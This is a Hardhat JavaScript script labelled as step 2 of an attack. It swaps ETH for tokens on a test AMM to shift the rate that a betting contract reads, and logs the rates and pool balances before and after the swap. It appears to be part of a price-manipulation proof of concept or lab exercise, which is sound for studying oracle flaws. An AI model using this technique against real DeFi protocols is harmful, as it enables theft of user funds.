//******* Step 2: Attacker manipulates AMM rate by making large swap  */
//---- swap Ether to Token ----  */

const {ethers} = require ("hardhat");
const {
    TestToken,
    BetContract,
    BetContract_Address,
    AMM,
    TestToken_Address,
    AMM_Address,
    BetContract_Abi,
    TestToken_Abi,
    AMM_Abi, alchemyProvider
} = require ("./beforeEach.js");
(async () => {
     try {
             
        console.log("bet rate",  ethers.formatUnits(await BetContract.betRate()));
        console.log("amm_current_Rate", ethers.formatUnits(await AMM.getRate(TestToken, ethers.ZeroAddress)) ) 
        console.log("amm Balance token", ethers.formatUnits(await TestToken.balanceOf(AMM_Address)) )
        console.log("amm balance ether", ethers.formatUnits(await alchemyProvider.getBalance(AMM_Address)) )  

        const amount_to_swap = ethers.parseEther("0.00001")
        const tx = await AMM.swapETHForTokens(1, {value:amount_to_swap });
        await tx.wait();
        console.log(tx);

        console.log("bet rate after swap = ",  ethers.formatUnits(await BetContract.betRate()));
        console.log("amm_current_Rate after swap = ", ethers.formatUnits(await AMM.getRate(TestToken, ethers.ZeroAddress)) ) 
        console.log("amm Balance token after swap = ", ethers.formatUnits(await TestToken.balanceOf(AMM_Address)) )
        console.log("amm balance ether after swap = ", ethers.formatUnits(await alchemyProvider.getBalance(AMM_Address)) )  
        
  


                } catch (error) {
                    console.error("Error fetching AMM rate:", error);
                }
})();